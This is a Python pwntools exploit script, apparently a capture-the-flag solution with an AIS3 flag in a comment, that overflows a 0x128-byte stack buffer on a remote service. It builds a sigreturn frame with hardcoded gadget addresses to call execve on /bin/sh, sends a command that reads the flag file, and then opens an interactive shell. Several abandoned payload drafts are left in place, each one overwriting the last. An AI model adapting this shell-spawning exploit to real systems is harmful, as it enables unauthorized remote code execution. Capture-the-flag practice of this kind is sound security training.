#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

# AIS3{r0p_is_e4sy_4nd_fUn}


context.arch = 'amd64'

host , port = 'pwnhub.tw' , 55688
#host , port = '192.168.78.141' , 4000
y = remote( host , port )


main = 0x4000b0
add_rsp_ret = 0x400103 # add rsp, 0x128 ret


sigframe = p64(main) + p64(0x0)
sigframe += (p64(0x0) * 2) * 6
sigframe += p64(0x0) + p64(0x0)       # rdi rsi
sigframe += p64(0x60010b) + p64(0x0)  # rbp rbx
sigframe += p64(0x0) + p64(0x3b)      # rdx rax
sigframe += p64(0x0) + p64(0x60010b)  # rcx rsp
sigframe += p64(main) + p64(0x0)  # rip eflags
sigframe += p64(0x33) + p64(0x0)      # cs  err




p = '\x00' * 0x128
p += flat( 0x4000f9 )

p = sigframe
p += 'D' * ( 0x128 - len( p ) )
p += p64( 0x4000f0 )

# execveat

p = '/bin/sh\x00'
#p = sigframe
p += 'D' * ( 0x128 - len( p ) )
p += p64( 0x4000f0 )
p += 'a' * ( 306 - len( p ) )

p = '/bin/sh\x00'
p += 'D' * ( 0x128 - len( p ) )
p += p64( 0x4000ed )
p += 'a' * ( 322 - len( p ) )


y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

#print hex(len(p64( main ) + '\x00' * 7))
#y.send( '/bin/sh\x00' + 'a' * (322 - 8) )

#print hex( len( p ) )

#y.sendline( p )

y.interactive()